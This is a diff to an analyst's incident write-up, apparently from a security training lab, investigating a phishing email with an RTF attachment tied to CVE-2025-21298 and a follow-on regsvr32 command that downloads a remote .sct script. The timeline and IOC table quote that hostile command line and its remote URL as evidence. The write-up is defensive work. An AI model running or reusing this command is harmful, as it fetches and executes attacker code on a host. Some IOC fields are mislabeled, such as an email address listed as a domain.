@@ -28,7 +28,7 @@ First actions taken. What did I check first, and why that, before anything else?
 |---|---|---|
 | 12:10 | Reviewed CVE linked to the rule | CVE-2025-21298 |
 | 12:15 | Reviewed Email Security on the source endpoint | Found a matching email from the source IP, with the time it was sent and an attachment: `mail.rtf`. |
-| 12:22 | Reviewed log management logs | Found that the destination IP address `172.16.17.137` made a **GET** request to the source IP address `84.38.130.118` via *http*. |
+| 12:22 | Reviewed log management logs | Found that the destination IP address `172.16.17.137` made a **GET** request to the source IP address `84.38.130.118` via *proxy*. |
 | 12:30 | Reviewed log management logs | Found raw data: Process: `cmd.exe`, Process ID: `6784`, Request URL: *http://84.38.130.118.com/shell.sct*. |
 | 12:32 | Reviewed endpoint process activity | Identified the Process ID along with its image path, parent path, desktop user, and target command line. |
 | 12:40 | Reviewed endpoint network connections | Found and confirmed the Source IP address that made the connection. |
@@ -42,13 +42,13 @@ First actions taken. What did I check first, and why that, before anything else?
 Step-by-step walkthrough of the analysis:
 - Logs/tools reviewed:
    - Log Management Tool: To confirm the connection pattern and frequency.
-   - Endpoint Security (EDR): To check what process on the host initiated the connection.
+   - Endpoint Security (EDR): To check which process on the host initiated the connection.
    - Endpoint Security (EDR): To collect data from the network action, terminal history, and browser history plugins on the host that initiated the connection.
    - DNS logs: To see if the destination IP was reached via a domain lookup or a hardcoded IP.
    - VirusTotal: Checked the reputation of the source IP, associated domain, and the malicious attachment.
 - Indicators found:
    - The source IP address `84.38.130.118` on port `80`, along with the email address `projectmanagement@pm.me`, sent an email to the destination IP address mentioned above. The email contained more than 20 words and included a malicious attachment that claimed to be from the project management team.
-   - The EDR (Event Data Recorder) provided crucial information that was identified as **vital** for analysis, along with the specific time and date when this data was flagged. This information is essential for understanding the context and circumstances surrounding the event:
+   - The EDR(Endpoint detection response) provided crucial information that was identified as **vital** for analysis, along with the specific time and date when this data was flagged. This information is essential for understanding the context and circumstances surrounding the event:
        - Feb 04 2025 08:06:42 - Source IP: `84.38.130.118`
        - Feb 04 2025 08:06:08 - `"C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll"`
    - A matching DNS query was submitted linking to the source IP: `projectmanagement@pm.me`.
@@ -66,9 +66,11 @@ Step-by-step walkthrough of the analysis:
 
 | Type | Value | Notes |
 |---|---|---|
-| IP | 203.160.68.12 | The IP address making the POST request for directory traversal. |
-| Port | 24124 | The port used by the source IP to initiate the connection. |
-| URL | /clients/MyCRL | The web remote path the adversary used to request a directory. |
+| IP | `84.38.130.118` | The IP address that sent the email. |
+| Domain | `projectmanagement@pm.me` | The subdomain from which the email originated. |
+| URL | `http://84.38.130.118.com/shell.sct` | It passes a target URL to the installation function. Instead of pointing to a local file, it forces regsvr32 to reach out over the network/internet to download a remote Windows Script Component (.sct) file. |
+| Command line | `C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll` | Launches the native Windows Command Prompt to execute the subsequent string asynchronously and then terminate immediately.|
+| Attachment | `mail.rtf` | A malicious attachment found in the mail received by Austin |
 
 <br>
 
